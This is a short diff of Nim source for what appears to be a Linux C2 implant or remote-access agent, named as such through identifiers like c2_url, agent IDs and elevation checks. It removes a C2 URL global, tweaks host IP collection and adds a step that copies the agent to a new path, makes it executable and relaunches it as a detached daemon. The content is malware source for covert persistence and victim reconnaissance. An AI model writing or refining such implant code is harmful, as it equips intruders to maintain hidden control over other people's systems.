@@ -22,7 +22,6 @@ proc collect_data(): bool
 proc get_linux_agent_id*(): string
 
 # Globals
-let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
 let client = newHttpClient(userAgent=get_linux_agent_id())
 
 
@@ -74,7 +73,7 @@ proc collect_data(): bool =
             is_admin = could_not_retrieve
         is_elevated = "False"
     try:
-        ipv4_local = execCmdEx(protectString("hostname -i"))[0].replace("\n", "")
+        ipv4_local = execCmdEx(protectString("hostname -I"))[0].replace("\n", "")
     except:
         ipv4_local = could_not_retrieve
     try:
@@ -122,6 +121,7 @@ proc linux_start*(): void =
         var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_linux)
+        discard execCmdEx(protectString("chmod +x ") & agent_execution_path_linux)
         discard startProcess(agent_execution_path_linux, options={poDaemon})
         quit()
 
